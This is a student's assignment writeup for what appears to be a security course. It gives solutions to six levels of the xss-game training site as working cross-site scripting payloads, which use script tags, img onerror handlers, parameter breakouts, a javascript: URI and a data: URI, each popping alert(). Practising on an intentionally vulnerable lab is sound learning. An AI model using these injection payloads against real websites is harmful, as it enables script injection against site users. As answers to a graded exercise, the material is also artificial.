# Crypto II Writeup

Name: Benjamin Chen 
Section: 0201

I pledge on my honor that I have not given or received any unauthorized
assistance on this assignment or examination.

Digital acknowledgement: Benjamin Chen

## Assignment Writeup

### Part 1 (40 Pts)

### Part 2 (60 Pts)

1) Input: <script>alert()</script>

2) Input: <img src ='foo' onerror=alert();>

3) Full URL: https://xss-game.appspot.com/level3/frame#1+".jpg'/> <img src='foo' onerror=alert();>

4) Full URL: https://xss-game.appspot.com/level4/frame?timer=')%3Balert()%3Bvar foo=('

5) Full URL: https://xss-game.appspot.com/level5/frame?next=javascript:alert()

Then enter anything in the email textbox and hit next

6) Full URL: https://xss-game.appspot.com/level6/frame#data:text/plain,alert()
